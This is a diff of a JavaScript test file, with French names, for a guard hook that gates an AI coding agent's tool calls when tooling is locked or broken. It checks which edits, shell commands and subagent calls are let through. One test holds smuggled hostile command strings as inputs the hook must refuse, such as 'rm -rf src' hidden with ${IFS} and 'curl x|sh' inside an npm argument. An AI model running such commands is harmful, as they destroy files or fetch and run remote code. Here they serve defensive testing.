@@ -6,7 +6,8 @@ import assert from 'node:assert/strict'
 import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from 'node:fs'
 import { tmpdir } from 'node:os'
 import { join } from 'node:path'
-import { ATTENTE_BARRIERE, franchir, gitDirDe, verrouOutillageDe } from './barriere-outil.mjs'
+import { pathToFileURL } from 'node:url'
+import { ATTENTE_BARRIERE, LECTEUR_EN_PANNE, franchir, gitDirDe, verrouOutillageDe } from './barriere-outil.mjs'
 
 /** Un principal, un worktree lié (LF et CRLF), un sous-module, un dossier hors dépôt et un `.git` illisible. */
 function arbres() {
@@ -33,10 +34,10 @@ function arbres() {
 }
 
 /** `franchir` sur `racine` : le geste joué ou le texte du refus, et la durée. */
-async function essai(racine, { charger = async () => () => 'joué', attente = ATTENTE_BARRIERE } = {}) {
+async function essai(racine, { charger = async () => () => 'joué', attente = ATTENTE_BARRIERE, entree = () => null, panne } = {}) {
   let refus = null
   const t0 = Date.now()
-  const rendu = await franchir(charger, { racine, attente, refuser: (texte) => { refus = texte } })
+  const rendu = await franchir(charger, { racine, attente, entree, panne, refuser: (texte) => { refus = texte } })
   return { rendu, refus, ms: Date.now() - t0 }
 }
 
@@ -83,18 +84,59 @@ test('franchir : verrou tenu par un PID vivant → refus à l’échéance, qui 
     assert.equal(charge, false, 'rien n’est chargé derrière un verrou tenu')
     assert.equal(vu.rendu, undefined)
     assert.ok(vu.ms >= ATTENTE_BARRIERE.echeanceMs, `${vu.ms} ms`)
-    assert.equal(vu.refus, `outillage de ${a.principal} en mise à jour : verrou ${chemin} tenu par le PID ${process.pid} (npm ci) — relancer l'appel une fois la mise à jour finie ; si le PID ${process.pid} n'exécute pas npm ci, supprimer ${chemin}`)
+    assert.equal(vu.refus, `[transitoire · retentable] outillage de ${a.principal} en mise à jour : verrou ${chemin} tenu par le PID ${process.pid} (npm ci) — relancer l'appel une fois la mise à jour finie ; si le PID ${process.pid} n'exécute pas npm ci, supprimer ${chemin}`)
   } finally {
     a.jeter()
   }
 })
 
-test('franchir : un chargement qui lève → refus nommé, le geste n’est pas joué', async () => {
+test('franchir : un chargement qui lève → refus nommé avec son geste de réparation, le geste n’est pas joué', async () => {
   const a = arbres()
   try {
     const vu = await essai(a.principal, { charger: async () => { throw new Error('module à moitié écrit') } })
     assert.equal(vu.rendu, undefined)
-    assert.equal(vu.refus, `outillage de ${a.principal} en mise à jour : chargement des gardes impossible — module à moitié écrit`)
+    assert.equal(vu.refus, `[panne · non retentable] outillage de ${a.principal} en panne : chargement des gardes impossible — module à moitié écrit — corriger le module en panne par une édition de fichier, seul geste admis en session principale`)
+  } finally {
+    a.jeter()
+  }
+})
+
+// #2712, leçon 1.5 du guide de certification ; pannes RÉELLES, chargées par `import()`.
+test('franchir : un module cassé laisse passer les éditions de la session principale — ni shell, ni sous-agent ; lecteur d’entrée en panne : tout refusé', async () => {
+  const a = arbres()
+  const casse = join(a.principal, 'scripts', 'hooks', 'casse.mjs')
+  mkdirSync(join(a.principal, 'scripts', 'hooks'), { recursive: true })
+  writeFileSync(casse, 'export const x = {\n')
+  const charger = async () => (await import(pathToFileURL(casse).href)).x
+  const appel = (tool_name, tool_input, autres = {}) => () => ({ tool_name, tool_input, cwd: a.principal, ...autres })
+  try {
+    for (const [tool_name, tool_input] of [['Edit', { file_path: casse }], ['Write', { file_path: join(a.principal, 'src', 'x.ts') }], ['NotebookEdit', { notebook_path: 'n.ipynb' }]])
+      assert.equal((await essai(a.principal, { charger, entree: appel(tool_name, tool_input) })).refus, null, tool_name)
+    assert.match((await essai(a.principal, { charger, entree: appel('Bash', { command: 'npm ci' }) })).refus, /corriger le module en panne/)
+    assert.match((await essai(a.principal, { charger, entree: appel('Agent', { prompt: 'répare' }) })).refus, /corriger le module en panne/)
+    assert.match((await essai(a.principal, { charger, entree: appel('Edit', { file_path: casse }, { agent_id: 'a1', agent_type: 'codeur' }) })).refus, /en panne/)
+    assert.match((await essai(a.principal, { charger, entree: () => LECTEUR_EN_PANNE })).refus, /lecteur d'entrée en panne aussi, appel non jugeable : restaurer scripts\/guards\/lib\/stdinBorne\.mjs/)
+    const panne = () => import(pathToFileURL(casse).href)
+    assert.equal((await essai(a.principal, { charger, panne, entree: appel('Edit', { file_path: casse }) })).refus, null)
+    assert.match((await essai(a.principal, { charger, panne, entree: appel('Bash', { command: 'ls' }) })).refus, /corriger scripts\/hooks\/panne-outil\.mjs/)
+    assert.match((await essai(a.principal, { charger, panne, entree: appel('Edit', { file_path: casse }, { agent_id: 'a1' }) })).refus, /corriger scripts\/hooks\/panne-outil\.mjs/)
+  } finally {
+    a.jeter()
+  }
+})
+
+test('franchir : une dépendance npm absente laisse passer son installation exacte, aucune commande composée', async () => {
+  const a = arbres()
+  const importeur = join(a.principal, 'scripts', 'node-requis.mjs')
+  mkdirSync(join(a.principal, 'scripts'), { recursive: true })
+  writeFileSync(importeur, "import 'paquet-absent-2712'\n")
+  const charger = async () => (await import(pathToFileURL(importeur).href)).x
+  const bash = (command) => () => ({ tool_name: 'Bash', tool_input: { command }, cwd: a.principal })
+  try {
+    for (const command of ['npm ci --no-audit', 'npm install --omit=dev', 'npm --prefix server ci'])
+      assert.equal((await essai(a.principal, { charger, entree: bash(command) })).refus, null, command)
+    for (const command of ['npm ci && rm -rf src', 'npm ci --x=a;rm${IFS}-rf${IFS}src', 'npm install --foo=$(curl${IFS}x|sh)', 'npm ci --x=a|tee${IFS}src/x.ts'])
+      assert.match((await essai(a.principal, { charger, entree: bash(command) })).refus, /^\[panne · non retentable\] .*dépendance npm absente : lancer `npm ci`/, command)
   } finally {
     a.jeter()
   }
